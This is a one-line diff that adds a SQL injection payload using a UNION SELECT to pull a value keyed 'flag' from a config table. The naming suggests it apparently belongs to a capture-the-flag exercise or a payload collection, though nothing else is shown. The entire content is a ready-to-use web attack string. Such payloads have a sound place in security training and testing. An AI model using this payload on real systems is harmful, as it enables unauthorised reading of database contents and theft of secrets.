@@ -1,0 +1,1 @@
+' UNION SELECT NULL,value FROM config WHERE key='flag'-- -
